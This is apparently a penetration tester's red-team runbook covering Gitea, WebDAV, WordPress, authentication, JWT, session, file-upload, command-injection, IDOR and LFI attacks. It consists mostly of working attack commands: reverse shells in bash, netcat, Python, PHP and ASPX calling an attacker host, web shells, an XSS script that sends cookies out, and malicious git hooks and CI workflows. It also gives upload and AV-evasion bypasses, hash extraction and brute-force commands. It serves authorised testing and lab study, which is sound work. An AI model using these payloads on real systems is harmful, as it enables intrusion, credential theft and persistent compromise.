docs.title: Red Team Runbook
docs.text: A practitioner's reference for offensive security operations — built from real engagements and lab work.

docs.title: About
docs.text:
This runbook is a living reference I've built working as a penetration tester specializing in web application security, while actively expanding into network, Active Directory, and full-scope engagements through lab environments (HackTheBox, GOAD, etc.).

It is not a tutorial. It assumes you know what you're doing and need to find the right command fast. Each section has been reviewed for accuracy and annotated with real-world notes — things that don't show up in documentation but matter in practice.

docs.title: What's Here
docs.text: Section What you'll find Information Gathering Per-service enumeration cheatsheets (22 services) Network Scanning & Recon Nmap, traffic capture, host enumeration Exploitation Shells, credential attacks, binary exploitation, frameworks Applications Web app exploits, fuzzing, auth attacks, tools Privilege Escalation Linux, Windows, Active Directory Persistence Linux/Windows backdoors, DLL injection, scheduled tasks Data Exfiltration File transfer techniques, secure channels Port Forwarding & Tunneling Ligolo-ng, Chisel, SSH tunneling Tools Bloodhound, Impacket, Mimikatz, NetExec, and more

docs.title: Annotations
docs.text:
Throughout the runbook you'll find three types of annotations:

Tip

Non-obvious shortcuts, personal tool preferences, and things worth knowing before you start.

Watch out

Common failure modes, things that get caught by AV/WAF, or mistakes that waste time.

From the lab

Observations from real HTB machines and lab environments. No box names or solutions — just the technique insight.

Built by aelder202.

docs.title: Gitea – Self-hosted Git Service
docs.text:
Tip

Check for public repos and exposed .git directories first. Gitea's explore page (/explore/repos) is unauthenticated by default — look for private-looking repos that were accidentally made public.

Watch out

Gitea admin credentials are often default (admin:admin or gitea:gitea) on self-hosted instances spun up quickly for labs or internal tools.

docs.title: Look for these indicators:
docs.text:
• Login page at /user/login

  • URL patterns like:

    http://$IP:3000/
http://$IP/user/<username>
http://$IP/api/v1/users

docs.title: HTTP Headers:
docs.text:
curl -I http://$IP:3000

Example:

Server: Gitea
Set-Cookie: i_like_gitea=...

docs.title: Nmap HTTP Title Scan
docs.text: nmap -p 3000 --script http-title $IP

docs.title: Check for Docker
docs.text:
Look for exposed Docker container info or docker-compose.yml for Gitea setup:

curl http://$IP:3000/.env
curl http://$IP:3000/docker-compose.yml

docs.title: Credential Extraction via SQLite
docs.text:
If you have access to the gitea.db file (e.g., through local file inclusion, volume mount, or post-exploitation), extract hashes using:

sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do \
digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); \
salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); \
name=$(echo $data | cut -d'|' -f3); \
echo "${name}:sha256:50000:${salt}:${digest}"; \
done | tee gitea.hashes

Hash format is compatible with hashcat mode 10900 (PBKDF2-HMAC-SHA256).

docs.title: Cracking with Hashcat
docs.text: hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --force

docs.title: 1. Anonymous Access to Public Repos
docs.text:
curl http://$IP:3000/<org>/<repo>/raw/branch/master/.env
curl http://$IP:3000/<org>/<repo>/archive/master.zip

Check for:

  • Hardcoded secrets, AWS creds

  • SSH private keys

  • DB creds

  • JWT secrets

  • .gitlab-ci.yml, .github/workflows/, Dockerfile

docs.title: 2. Open Registration + Privilege Escalation
docs.text:
If registration is allowed:

  1. Register a user

  2. Try accessing /admin or exploiting insecure direct object references (IDOR)

docs.title: 3. Exposed Webhooks
docs.text:
Look for outbound webhook definitions in:

http://$IP:3000/<org>/<repo>/settings/hooks

You may be able to inject or redirect webhooks to attacker-controlled infrastructure for SSRF or command execution in CI/CD setups.

docs.title: Dump All Users
docs.text: SELECT id, name, passwd, email FROM user;

docs.title: Check Admin Users
docs.text: SELECT name, is_admin FROM user WHERE is_admin=1;

docs.title: List All Repositories
docs.text: SELECT id, name, owner_id FROM repository;

docs.title: Check for Webhooks
docs.text: SELECT * FROM webhook;

docs.title: Method 1: Create New User
docs.text:
If you're post-auth and have admin access, create a user with access to all orgs/repos.

POST /admin/users/new

docs.title: Method 2: Modify Existing Repo
docs.text:
• Add a backdoor script into a repo

  • Create a webhook to auto-trigger malicious actions (RCE in CI/CD)

docs.title: Method 3: Reverse Shell via Git Hooks (If Server-Side Exec Enabled)
docs.text:
1. Add post-receive or post-commit hook:
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > .git/hooks/post-receive
chmod +x .git/hooks/post-receive
  1. Push repo and trigger reverse shell.

docs.title: Method 4: Abuse Git Actions or Pipelines
docs.text:
Upload .github/workflows/pwn.yml:

name: reverse shell
on: [push]
jobs:
  shell:
    runs-on: ubuntu-latest
    steps:
      - run: bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

docs.title: sqlite3 – Used to extract hash and user data from gitea.db.
hashcat – Crack PBKDF2-SHA256 hashes.
docs.text: hashcat -m 10900 gitea.hashes rockyou.txt

https://github.com/HightechSec/gitea-dumper

docs.text: git-dumper http://$IP/<repo> /tmp/output/

docs.title: WebDAV – Web Distributed Authoring and Versioning
docs.text:
Tip

Use cadaver for interactive WebDAV access or davtest to quickly test which file types can be uploaded. If PUT is allowed, try uploading .asp, .aspx, .php — whichever matches the server stack.

Watch out

WebDAV PROPFIND can enumerate the directory structure even without write access — always check what's exposed before focusing on upload attacks.

docs.title: How to Identify WebDAV on a Target
Identify WebDAV Support via HTTP Methods
docs.text:
Use OPTIONS to identify allowed methods:

curl -X OPTIONS http://$IP -i

Look for:

Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, COPY, MOVE, MKCOL
DAV: 1,2

docs.title: Nmap Detection
docs.text:
nmap -p 80,443 --script http-methods,http-webdav-scan $IP

or, more simply: 

sudo nmap -p 80 -sC $IP

Key Nmap scripts:

  • http-methods: Lists supported HTTP verbs.

  • http-webdav-scan: Checks for WebDAV functionality and upload support.

docs.title: WebDAV Methods That Indicate Danger
docs.text: Method Description Risk PUT Uploads files to server Allows arbitrary file upload DELETE Removes files Can delete site content MKCOL Creates new directory Enables structured uploads PROPFIND Queries metadata (like ls) Used for enumeration MOVE Moves files Can bypass security controls COPY Copies files Allows backup duplication

docs.title: Using curl
docs.text:
curl -X OPTIONS http://$IP

Check for DAV: header and dangerous HTTP methods.

docs.title: Using davtest
docs.text:
davtest -url http://$IP

  • Tests if PUT works.

  • Tries to upload test payloads like .php, .asp, .jsp, .pl.

docs.title: Using Metasploit
docs.text:
use auxiliary/scanner/http/webdav_scanner
set RHOSTS $IP
run

docs.title: Using cadaver to Upload Payload
docs.text:
cadaver http://$IP
put shell.php

docs.title: Upload with Extension Bypass
docs.text:
curl -X PUT --data-binary @shell.php http://$IPshell.php;.jpg

Try:

  • shell.pHp

  • shell.php;.jpg

  • shell.ph%00p

docs.title: cadaver
docs.text:
• Interactive WebDAV client.

  • Use for listing, uploading, downloading, or deleting files.

cadaver http://$IP

docs.title: davtest
docs.text:
• Automated scanner and uploader.

  • Uploads various file types and checks for execution.

davtest -url http://$IP

docs.title: curl
docs.text:
• For HTTP method testing and uploading payloads.
curl -T <file> http://$IP

docs.title: Metasploit
docs.text: use auxiliary/scanner/http/webdav_scanner

docs.title: PHP Reverse Shell Example
docs.text:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>

or, grab from Kali: 

cp /usr/share/webshells/php/php-reverse-shell.php .

docs.title: ASPX Reverse Shell Example (for IIS targets)
docs.text:
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/shell.ps1')\""); %>

or, grab from Kali: 

cp /usr/share/webshells/aspx/cmdasp.aspx .

docs.title: Bypasses and Defense Evasion
docs.text:
• .htaccess Bypass:

    • Modify file handling to allow .php.txt execution.

  • Extension Obfuscation:

    • shell.pHp, shell.php;.txt, shell.php%00.jpg

  • HTTP Verb Tunneling:

    • Some WAFs block PUT, but not POST + X-HTTP-Method-Override.
curl -X POST -H "X-HTTP-Method-Override: PUT" --data-binary @shell.php http://$IP

  • Double-Encoding:

    • Use %252e instead of . in file names.

docs.title: WebDAV + IIS (Windows Targets)
docs.text:
• WebDAV often installed with IIS 6.0/7.5/10.

  • Upload .aspx, .asp, or .config files for RCE.

  • File upload path often accessible at:

    http://$IP/uploads/shell.aspx

Check if WebDAV is enabled:

curl -I http://$IP/uploads/

docs.title: WordPress – Attack Surface & Exploitation
docs.text:
Tip

wpscan --url <target> --enumerate u to enumerate users first — then target those accounts. Check /wp-json/wp/v2/users for unauthenticated user enumeration even if wpscan is blocked.

Watch out

wpscan's plugin/theme detection is noisy and slow. Run --enumerate p only after confirming the scan won't trip rate limiting or WAF rules.

docs.title: Identify WordPress CMS
docs.text:
Look for:

  • /wp-admin/, /wp-login.php, /xmlrpc.php

  • HTML meta generator tags: content="WordPress 5.8.1"

  • Common file structure: wp-content/themes, wp-includes

docs.title: Tools
docs.text:
WhatWeb:

whatweb http://target

Wappalyzer (Browser Plugin)

Nmap + NSE:

nmap -p 80,443 --script http-wordpress-enum $IP

docs.title: WPScan – WordPress Scanner
docs.text: Site: https://wpscan.com/ API: Requires free registration for vulnerability DB access.

docs.title: Install WPScan
docs.text: sudo gem install wpscan

docs.title: Quick Scan
docs.text: wpscan --url http://target

docs.title: Enumerate Plugins & Versions
docs.text:
wpscan --url http://target -e vp --api-token $TOKEN -o wpscan.log

  • -e vp – Enumerate vulnerable plugins

  • -e p – Enumerate all plugins

  • -e u – Enumerate usernames

  • --api-token – Use your API key for vulnerability DB

  • -o – Output scan to file

docs.title: Full Enumeration Example
docs.text:
wpscan --url http://target -e ap,at,cb,dbe,u,m --api-token $TOKEN
Flag Description ap All Plugins at All Themes cb Config Backup Files (wp-config.php~) dbe DB Exports (e.g., .sql) u Usernames m Media files

docs.title: Brute Force Login (XML-RPC or wp-login)
docs.text:
wpscan --url http://target -U users.txt -P rockyou.txt --api-token $TOKEN

Or use:

hydra -l admin -P rockyou.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"

docs.title: Exploiting Vulnerable Plugins
docs.text:
Use:

  • WPScan results to identify CVEs

  • searchsploit for local exploit POCs

  • exploit-db, GitHub, or known RCE plugin exploits

Example:

searchsploit wp plugin <plugin-name>

docs.title: Exploit Upload Functionality
docs.text:
If plugin allows file upload (like contact-form-7, revslider, etc.):

  1. Upload .php reverse shell

  2. Access uploaded shell in browser

  3. Trigger reverse shell back to listener

nc -lvnp 4444

docs.title: Gain WP Admin Shell via Theme/Plugin Editor
docs.text:
1. Navigate to: /wp-admin/theme-editor.php

  2. Edit 404.php or functions.php:

<?php system($_GET['cmd']); ?>
  1. Browse to:
http://target/wp-content/themes/<theme>/404.php?cmd=whoami

docs.title: Create Admin User via Shell
docs.text:
<?php
require('wp-load.php');
$user = 'pentester';
$pass = 'SuperSecure123!';
$email = 'root@localhost';
if (!username_exists($user)) {
  $user_id = wp_create_user($user, $pass, $email);
  $user = new WP_User($user_id);
  $user->set_role('administrator');
}
?>

Access via:

http://target/wp-content/uploads/admin_create.php

docs.title: Public Disclosure of Sensitive Files
docs.text:
Try:

curl http://target/.git/config
curl http://target/wp-config.php~
curl http://target/wp-content/debug.log

docs.title: Common WordPress Files to Check
docs.text:
• wp-config.php

  • .htaccess

  • .user.ini

  • .env

docs.title: XML-RPC Abuse
docs.text:
Used for brute-force and pingback SSRF:

curl -X POST -d @payload.xml http://target/xmlrpc.php

Payload:

<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com</string></value></param>
    <param><value><string>http://localhost/</string></value></param>
  </params>
</methodCall>

docs.title: WPScan
docs.text:
• Comprehensive enumeration and vulnerability identification

  • Use with --api-token for CVE lookup

docs.title: Metasploit Modules
docs.text:
search wordpress

Examples:

  • exploit/unix/webapp/wp_admin_shell_upload

  • exploit/multi/http/wp_crop_rce

docs.title: Burp Suite
docs.text:
• For fuzzing form parameters

  • Bypassing WAFs or login brute-force throttling

docs.title: Wordlist Suggestions
docs.text:
• SecLists/Discovery/Web-Content/CMS/wordpress.txt

  • rockyou.txt for brute-force

docs.title: References
docs.text:

  • https://github.com/wpscanteam/wpscan

docs.title: Identifying Authentication Mechanism
docs.text:
Tip

Username enumeration via timing or error message differences is often easier than brute-forcing — confirm valid usernames first, then target those with a password list.

Watch out

Always check for account lockout before running hydra or Burp Intruder. A single locked account will alert a blue team immediately. Test with 2-3 attempts on a throwaway account first.

Before brute-forcing, determine the type of authentication used:

  1. Form-Based Authentication

    • Uses username and password fields in an HTML form.
    • Typically sends HTTP POST requests for login.

  2. Basic/Digest Authentication

    • Sends credentials via Authorization: Basic <Base64-encoded credentials> in HTTP headers.
    • Often used for web servers and API endpoints.

  3. Token-Based Authentication (JWT, OAuth, API Keys)

    • Uses tokens for authentication instead of passwords.
    • Often found in modern API authentication mechanisms.

docs.title: HTTP Basic Authentication
docs.text: hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 192.168.177.90 http-get

docs.title: HTTP POST Form Brute-Force
docs.text:
hydra -L users.txt -P passwords.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
  • -L users.txt → Uses a list of usernames.
  • -P passwords.txt → Uses a list of passwords
  • :F=incorrect → Defines a failed login message to filter incorrect attempts.

docs.title: SMB Brute-Force
docs.text: hydra -L users.txt -P passwords.txt smb://192.168.1.10

docs.title: Brute-Forcing Web Authentication
docs.text:
crackmapexec http <target-ip> -u users.txt -p passwords.txt --auth-form /login.php
  • -u users.txt → Usernames list.
  • -p passwords.txt → Passwords list.
  • --auth-form /login.php → Targets a login form for brute-force attempts.

docs.title: SMB Brute-Forcing
docs.text: crackmapexec smb <target-ip> -u users.txt -p passwords.txt

docs.title: RDP Brute-Forcing
docs.text: crackmapexec rdp <target-ip> -u users.txt -p passwords.txt

docs.title: Preventing Account Lockout
docs.text:
• Use a slow attack rate: Adding delays between requests reduces detection.
  • Monitor response messages: Some applications return different error messages for valid vs. invalid users.

docs.title: Identifying JWT Usage
docs.text:
Tip

Try alg: none first — some libraries still accept unsigned tokens. If RS256 is used, check if the public key is exposed (e.g. /jwks.json) and try switching to HS256 signed with the public key as the secret.

Watch out

JWT signature validation failures often return a generic 401 — confirm you're actually testing the right field by checking what the app decodes, not just what it rejects.

docs.title: Using Burp Suite
docs.text:
• Capture requests and inspect the Authorization header.
  • Look for Authorization: Bearer <JWT>.

docs.title: Extracting JWT from cURL Responses
docs.text:
curl -v http://<target-ip>/api -H "Authorization: Bearer <JWT>"
  • -v → Enables verbose output to inspect headers.

docs.title: Decoding a JWT
docs.text: echo "<JWT Token>" | jwt_tool -d

docs.title: None Algorithm Attack
docs.text:
If the server does not validate the algorithm field properly, change it to none and remove the signature.

{
  "alg": "none",
  "typ": "JWT"
}

Replay the modified token:

curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api

docs.title: Signature Forgery with Weak Secrets
docs.text:
If a weak secret is used to sign the JWT, brute-force it with John the Ripper:

echo "<JWT_SECRET>" > jwt_secret.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_secret.txt
  • Attempts to recover the secret key.

docs.title: Key Confusion Attack
docs.text:
If the server accepts public keys for verification, attempt to sign the JWT with a known key.

jwt_tool -I -S rsa256 -pk mypublic.pem
  • -I → Interactively modifies the JWT.
  • -S rsa256 → Uses the RSA256 signing algorithm.

docs.title: Token Expiry Manipulation
docs.text:
If the server does not properly validate token expiration (exp claim), modify and replay it:

{
  "exp": 9999999999
}

Encode and replay:

curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api

docs.title: Identifying Session Cookies
docs.text:
Tip

Session tokens in URL parameters (not cookies) are the easiest to steal — look for ?session=, ?token=, or ?sid= in links. Check Referer header leakage too.

Watch out

HttpOnly cookies can't be stolen via XSS. If the cookie has HttpOnly, pivot to CSRF or session fixation instead of cookie theft.

docs.title: Using Burp Suite
docs.text:
• Go to Proxy > HTTP History and inspect Set-Cookie headers.
  • Look for session-related values such as PHPSESSID, JSESSIONID, auth, or sessionid

docs.title: Using cURL to Capture Cookies
docs.text:
curl -c cookies.txt -b cookies.txt -v http://<target-ip>/profile
  • -c cookies.txt → aves cookies to a file.
  • -b cookies.txt → Reuses stored cookies in subsequent requests.
  • -v → Enables verbose output to analyze responses.

docs.title: Using Browser DevTools
docs.text:
• Open Developer Tools (F12 in Chrome/Firefox).
  • Navigate to Application > Storage > Cookies.
  • Locate authentication cookies or session tokens.

docs.title: XSS Exploitation
docs.text:
If a Cross-Site Scripting (XSS) vulnerability is present, use it to steal session cookies:

<script>document.location='http://<attacker-ip>/steal.php?cookie='+document.cookie</script>
  • Redirects the victim's session cookie to an attacker-controlled endpoint.

To capture the stolen cookie, listen on the attacker's machine:

nc -lvnp 80

docs.title: Session Fixation Attack
docs.text:
If the server allows session IDs in URLs or GET requests, an attacker can fix a victim's session to a known value.

  1. Force the victim to use a known session ID:
http://target.com/login?sessionid=ATTACKERSESSION
  1. Once the victim logs in, reuse the session:
curl -b "sessionid=ATTACKERSESSION" http://target.com/dashboard

docs.title: Token Theft
docs.text:
If the application uses JWT tokens or API keys:

  1. Capture the Authorization: Bearer <JWT> header.

  2. Decode the JWT for useful information: 

    echo "<JWT Token>" | jwt_tool -d

  3. Modify the token and replay it: 

    curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api

docs.title: dirsearch
docs.text:
Wordlist selection

Start with raft-medium-directories.txt for general discovery. Use common.txt if you need speed over coverage. directory-list-2.3-big.txt only when you've confirmed there's something worth finding — it's slow. For API endpoints, use api/api-endpoints.txt from SecLists.

Watch out

Always set --hc 404 (or equivalent) to hide 404s. Also filter by response size if the app returns 200 for everything — --fs <size> in ffuf.

dirsearch -u $URL -x 403,404
* -u $URL to provide URL * -x 403,404 to exclude 403,404 responses

docs.title: wfuzz
docs.text:
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 $URL/FUZZ

  • -c → Enables color in the output for easier readability.

  • -z file,<file> → Specifies a wordlist.

  • --hc 404 → Hides results with HTTP status code 404. Multiple codes can be added: 404,403,500.

  • --sc 200 → Shows only HTTP status code 200 responses (useful for filtering valid pages).

docs.title: additional wfuzz filters
docs.text:
• Find admin panels:

    wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/admin-panels.txt --hc 404 $URL/FUZZ

  • Find backup files:

    wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/backup-files.txt --hc 404 $URL/FUZZ

docs.title: gobuster
docs.text:
gobuster dir -e -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,html,txt --status-codes-blacklist "404" -q

  • dir → Performs directory brute-forcing.

  • -e → Expanded mode (prints full URL).

  • -x php,html,txt → Specifies file extensions to append to each word in the wordlist (e.g., .php, .html, .txt).

  • --status-codes-blacklist "404" → Excludes responses with status code 404.

  • -q → Suppresses progress output, making results cleaner.

  • -b 403,500 → Excludes additional status codes from the results.

docs.title: additional gobuster scans
docs.text:
• Recursive directory enumeration:

    gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -r

  • Virtual host fuzzing:

    gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

docs.title: feroxbuster
docs.text:
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 10 -filter-status 403,404

  • -x php,txt,html → Look for specific file extensions.

  • -r → Follow redirects.

  • -t 10 → Set the number of threads to use (increase for faster scanning).

  • -n → Don't print the banner for a cleaner output.

  • -d 2 → Set recursion depth (useful for deep enumeration of nested directories).

docs.title: additional feroxbuster usage
docs.text:
• Recursive enumeration with depth limit:

    feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/common.txt -d 3

  • Silent mode for automation:

    feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/common.txt -q

docs.title: Gathering Server Headers
docs.text:
Tip

Response headers often reveal framework and version: X-Powered-By, Server, X-Generator. Also check error pages — frameworks leak version info in stack traces.

Watch out

Don't rely solely on HTTP headers for fingerprinting — they can be spoofed or stripped. Confirm with behavior-based checks (error message format, cookie names, response timing).

Server headers provide insights into the web server, application frameworks, and security mechanisms in place.

docs.title: Using Curl
docs.text:
curl -s -I $URL

  • -s: Silent mode (hides progress)

  • -I: Fetches headers only

docs.title: Using Netcat
docs.text: nc -v $IP 80 HEAD / HTTP/1.1 Host: $IP

docs.title: Using WhatWeb
docs.text:
whatweb -a 3 $URL
  • -a 3: Aggressive scanning mode

docs.title: Using Wappalyzer
docs.text:
Wappalyzer is a browser extension and CLI tool for detecting web technologies. 

wappalyzer-cli https://target.com

docs.title: Using Nmap
docs.text:
nmap -sV -p 80,443 $IP

  • -sV: Service version detection

  • -p: Specify common web ports

To target a broader range:

nmap -p- -sV $IP

docs.title: Using Nikto
docs.text:
nikto -h $URL
  • Scans for web vulnerabilities and security misconfigurations

docs.title: Security Headers and SSL/TLS
docs.text: Security headers help protect against various attacks, including cross-site scripting (XSS) and clickjacking.

docs.title: Checking Security Headers
docs.text:
SecurityHeaders provides an analysis of missing HTTP headers.

Alternatively, use Curl: 

curl -s -I $URL | grep -E "Strict-Transport-Security|X-Frame-Options|X-Content-Type-Options|Content-Security-Policy"

docs.title: SSL/TLS Analysis
docs.text:
Qualys SSL Labs evaluates a website's SSL/TLS configuration.

sslscan $IP
or 
openssl s_client -connect $IP:443

docs.title: Subdomain & Parameter Fuzzing
docs.text:
🔗 references: OWASP Amass

Tip

For parameter fuzzing, x8 is faster than ffuf for discovering hidden parameters in existing endpoints. For subdomain fuzzing, filter by response size — wildcard DNS returns 200 for everything.

Watch out

Virtual host fuzzing requires the Host header, not the URL. Use ffuf -H "Host: FUZZ.target.com" — changing the URL path won't work.

docs.title: subfinder
docs.text: subfinder -d $URL

docs.title: amass
docs.text:
amass enum -passive -d $URL
  • -passive → Runs passive enumeration to avoid triggering alerts.

docs.title: gobuster
docs.text: gobuster dns --do $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

docs.title: ffuf
docs.text:
ffuf -u 'http://target.com' -H 'Host: FUZZ.target.com' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  • -fc 301 → Filters out HTTP 301 responses.
  • -fs → Filters responses by size.

docs.title: ffuf
docs.text: ffuf -u "http://<target-ip>/page.php?FUZZ=value" -w /usr/share/seclists/Fuzzing/special-chars.txt

docs.title: arjun
docs.text:
arjun -u http://<target-ip>/page.php -w /usr/share/seclists/Fuzzing/special-chars.txt
  • Automates parameter fuzzing for GET and POST requests.
  • Supports JSON and XML-based APIs.

docs.title: Testing for Command Injection
docs.text:
Tip

If semicolons are filtered, try |, ||, &&, or newline injection (%0a). On Windows, use & instead of ;. Always test both Linux and Windows separators — you often don't know the OS.

Watch out

Blind command injection with sleep 5 confirms execution but burns time. Use curl or ping to an OOB server for faster confirmation.

docs.title: Basic Payloads for Testing
docs.text:
Try injecting common shell metacharacters to test for execution:

; whoami
& id
| uname -a
$(whoami)

If the application is vulnerable, it will execute the commands and return the results.

docs.title: Using nslookup and ping for Out-of-Band (OOB) Testing
docs.text:
If direct command output is not returned, test with OOB techniques by triggering DNS or ICMP requests to your controlled server:

nslookup attacker.com
ping -c 1 attacker.com

On the attacker's machine, listen for incoming connections:

tcpdump -i eth0 icmp
tcpdump -i eth0 port 53

docs.title: Gaining Shell Access
docs.text: If command injection is confirmed, attempt to establish an interactive shell using reverse shell payloads:

docs.title: Bash Reverse Shell
docs.text: bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1

docs.title: Netcat Reverse Shell
docs.text:
nc -e /bin/sh <attacker-ip> <port>

If the target lacks -e support, use:

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> <port> >/tmp/f

docs.title: Python Reverse Shell
docs.text: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

docs.title: PHP Reverse Shell
docs.text: php -r '$sock=fsockopen("<attacker-ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

docs.title: Encoding Payloads to Evade Filtering
docs.text: Some applications block common payloads. Use encoding techniques to bypass input validation:

docs.title: URL Encoding
docs.text: %3B%20whoami

docs.title: Base64 Encoding
docs.text:
Encode the command:

echo "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1" | base64

Decode and execute:

echo "<encoded-command>" | base64 -d | bash

docs.title: commix
docs.text:
Automate command injection exploitation:

commix --url="http://target.com/vuln.php?id=1"

docs.title: sqlmap (for SQL-Based Command Execution)
docs.text: sqlmap -u "http://target.com/index.php?id=1" --os-shell

docs.title: Privilege Escalation via Command Injection
docs.text: If the exploited command runs as a low-privileged user, attempt privilege escalation by leveraging SUID binaries or misconfigurations:

docs.title: Checking for SUID Binaries
docs.text: find / -perm -4000 -type f 2>/dev/null

docs.title: Exploiting Misconfigured Sudo Permissions
docs.text:
Check for misconfigured sudo access:

sudo -l

If a binary can be executed with sudo, try escalating:

sudo <binary> /bin/sh

docs.title: Spawning a TTY Shell
docs.text:
Upgrade a basic shell for interactive use:

python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo; fg
export TERM=xterm

docs.title: Bypassing File Upload Restrictions
docs.text:
Tip

If .php is blocked, try .php5, .phtml, .phar, .php.jpg (double extension). Check if the server strips or ignores the second extension. MIME type checks are often client-side only — bypass with Burp.

Watch out

Uploading a web shell to a path you can't reach is useless. Confirm the upload directory is web-accessible before spending time on the payload.

docs.title: Changing File Extensions
docs.text:
If an application allows you to upload files, capture the request through Burp Suite and attempt to bypass restricted file types, if restrictions are in place, by using the following: 

shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
shell.PHP5

docs.title: Changing Content-Type Header
docs.text:
Modify the header to bypass weak validation: 

Content-Type: image/jpeg

docs.title: Using Magic Bytes for Spoofing
docs.text:
Some applications check magic bytes instead of extensions. Use a valid image header followed by PHP code: 

echo -ne "\xFF\xD8\xFF\xE0" > shell.jpg
cat shell.php >> shell.jpg

docs.title: Web Shells
docs.text:
Attempt to obtain a web shell by uploading PHP code (which can be obtained from revshells) to execute commands. ```php title=web_shell.php

```bash
curl http://target.com/uploads/web_shell.php?cmd=id

docs.title: Reverse Shells
docs.text:
Alternatively, attempt to gain immediate access to the target by attempting to obtain a reverse shell.

```php title=rev_shell.php

& /dev/tcp// 0>&1'"); ?> 
Start an NC listener on the appropriate port, then attempt to direct to the shell page to execute.
```bash
nc -lvnp <port>

curl http://target.com/uploads/rev_shell.php

docs.title: MSFVenom
docs.text:
Easily create a reverse PHP shell by using msfvenom: 

msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php

docs.title: Evading AV and Security Controls
docs.text:
• Encode the Payload: Base64 encode PHP code and decode on execution: 

    <?php eval(base64_decode("c3lzdGVtKCd3aG9hbWknKTs=")); ?>

  • Use Dynamic Payload Execution: 

    <?php $c=$_GET['cmd']; system($c); ?>

docs.title: Tools for File Upload Exploitation
docs.text:
• ExifTool – Modify file metadata to bypass file type validation: 

    exiftool -Comment="<?php system($_GET['cmd']); ?>" shell.jpg

  • Wfuzz / FFUF – Automate directory fuzzing for hidden upload endpoints.

docs.title: Identifying IDOR Vulnerabilities
docs.text:
Tip

IDORs often hide in non-obvious parameters: user_id, account, ref, UUIDs in API responses. Use Burp’s Autorize extension to automate testing across roles — manually replacing IDs is slow.

Watch out

Some IDORs are write-only (you can modify but not read). Test PUT/PATCH/DELETE on other users’ resources, not just GET.

Manually testing for IDOR involves:

  • Checking for Predictable Identifiers: Change numeric values in URLs and see if unauthorized data is returned.

  • Testing for Unauthenticated Access: Access a valid object reference while logged out.

  • Using Burp Suite’s Intruder: Automate IDOR detection by fuzzing object IDs.

  • Inspecting API Requests: Modify request bodies or query parameters to request unauthorized data.

ffuf -w /usr/share/seclists/Fuzzing/parameter-names.txt -u http://target.com/profile.php?user=FUZZ -fs 403

docs.title: User Account Enumeration
docs.text:
If user profiles are accessible by modifying an ID, attempt to enumerate users:

GET /profile/1234 HTTP/1.1
Host: target.com
Cookie: session=abcd1234

Modify 1234 to other user IDs (1233, 1235, etc.) and check for unauthorized data exposure.

docs.title: Accessing Restricted Files
docs.text:
Some applications allow unauthorized downloads of files by altering the filename parameter:

GET /download?file=secret_report.pdf

Change file=secret_report.pdf to another filename:

GET /download?file=employee_salaries.pdf

docs.title: Changing Account Permissions
docs.text:
If an API request updates user roles, modify the request to escalate privileges:

POST /api/updateRole
Content-Type: application/json

{
  "user_id": "1234",
  "role": "admin"
}

docs.title: Tools for IDOR Exploitation
docs.text:
• Burp Suite – Intercept and manipulate requests.
  • FFUF / Wfuzz – Automate object ID fuzzing.
  • Postman – Send API requests for manual testing.
  • Param Miner – Discover hidden parameters that could lead to IDOR.

docs.title: References
docs.text: PayloadsAllTheThings - LFI HackTricks - LFI Fimap LFI Suite Commix

docs.title: Identifying LFI Vulnerabilities
docs.text:
Tip

If ../ is filtered, try ....// (double-dotslash) or URL-encode to %2e%2e%2f. PHP include() is case-insensitive on Windows targets — ../ETC/PASSWD still works.

Watch out

Log poisoning for RCE requires write access to a log file AND the ability to include it. Confirm both before spending time on payloads — many targets have logs in non-default paths.

Look for parameters that reference files: 

http://target.com/index.php?page=home.php

Test various payloads to see if file traversal is possible: 

http://target.com/index.php?page=../../../../etc/passwd

docs.title: Using Burp Suite
docs.text:
1. Capture a request containing a file inclusion parameter.
  2. Use Intruder to automate directory traversal payloads (../, %2e%2e/, %252e%252e/, etc.).
